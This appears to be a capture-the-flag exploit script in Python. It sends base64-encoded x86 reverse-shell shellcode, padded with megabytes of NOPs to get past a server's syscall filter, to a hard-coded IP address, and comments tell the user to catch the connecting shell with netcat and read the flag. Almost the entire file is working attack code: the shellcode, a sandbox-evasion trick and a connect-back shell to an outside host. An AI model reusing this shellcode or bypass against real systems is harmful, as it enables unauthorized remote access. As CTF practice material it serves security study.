from pwn import *
from base64 import b64encode

# reverse shell to my ip:1234
shell = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x56\x7d\x1a\x80\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# fill more than 2 MB with data, so we will get an
# error when checking for bad syscalls
shell += asm("nop; " * (2 * 1024 * 1024))

# encode
shell = b64encode(shell)


from requests import post, get, session

# before running the script open a netcat -l 1234
# and do proper port forwarding
s = session()
s.get("http://178.128.100.75/")

# when request started, you should type 'cat flag'
# into the netcat window few times
# the reverse shell will run for only 2 seconds (timeout on the server)
# then the flag will pop out
# PS: you could automate the netcat listener, I was to lazy to do it
resp = s.post("http://178.128.100.75/exploit", json = {"payload" : shell})

print (resp.content)
